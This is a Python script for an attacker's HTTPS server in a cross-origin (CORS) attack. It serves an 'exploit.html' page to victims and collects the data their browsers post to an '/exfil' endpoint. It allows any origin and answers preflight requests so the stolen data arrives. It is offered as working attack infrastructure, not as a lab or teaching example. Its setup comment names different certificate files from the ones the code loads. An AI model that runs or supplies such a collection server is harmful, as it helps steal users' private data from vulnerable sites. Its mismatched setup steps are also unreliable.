#!/usr/bin/env python3

# Simple HTTP server to send and receive CORS exploits and data
# Put a CORS exploit into: "exploit.html"

# Remember to create TLS keys:
# openssl req -new -x509 -days 365 -nodes -out server.crt -keyout server.key -subj "/CN=localhost"

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import ssl

class CorsHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/exfil':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                print("\n[+] CORS DATA RECEIVED!")
                print("-" * 50)
                print(json.dumps(data, indent=2))
                print("-" * 50)
                
            except Exception as e:
                print(f"Error processing incoming data: {e}")
            
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            # Serve the exploit page
            with open('exploit.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), CorsHandler)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
    server.socket = context.wrap_socket(server.socket, server_side=True)

    print("Serving HTTPS on port 8000")
    server.serve_forever()